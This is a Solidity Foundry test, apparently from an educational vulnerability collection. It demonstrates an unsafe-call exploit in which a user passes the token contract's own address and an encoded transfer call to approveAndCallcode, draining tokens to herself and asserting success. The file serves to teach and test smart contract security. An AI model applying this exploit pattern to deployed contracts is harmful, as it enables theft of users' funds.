// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "../src/UnsafeCall.sol";

contract UnsafeCallExploit is Test {
    TokenWhale TokenWhaleContract;
    address alice;

    function setUp() public {
        alice = vm.addr(1);
        TokenWhaleContract = new TokenWhale();
        TokenWhaleContract.TokenWhaleDeploy(address(TokenWhaleContract));

        console.log("TokenWhaleContract balance: ", TokenWhaleContract.balanceOf(address(TokenWhaleContract)));
    }

    function testUnsafeCall() public {
        // bytes memory payload = abi.encodeWithSignature("transfer(address,uint256)", address(alice), 1_000);

        console.log("Alice tries to perform an unsafe call to transfer assets from TokenWhaleContract");

        vm.prank(alice);
        TokenWhaleContract.approveAndCallcode(
            address(TokenWhaleContract),
            0x1337, // does not matter
            abi.encodeWithSignature("transfer(address,uint256)", address(alice), 1_000)
        );

        assertEq(TokenWhaleContract.balanceOf(address(alice)), 1_000);
        console.log("Exploit successful!");
        console.log("TokenWhaleContract balance: ", TokenWhaleContract.balanceOf(address(TokenWhaleContract)));
        console.log("Alice balance: ", TokenWhaleContract.balanceOf(address(alice)));
    }

    receive() external payable {}
}
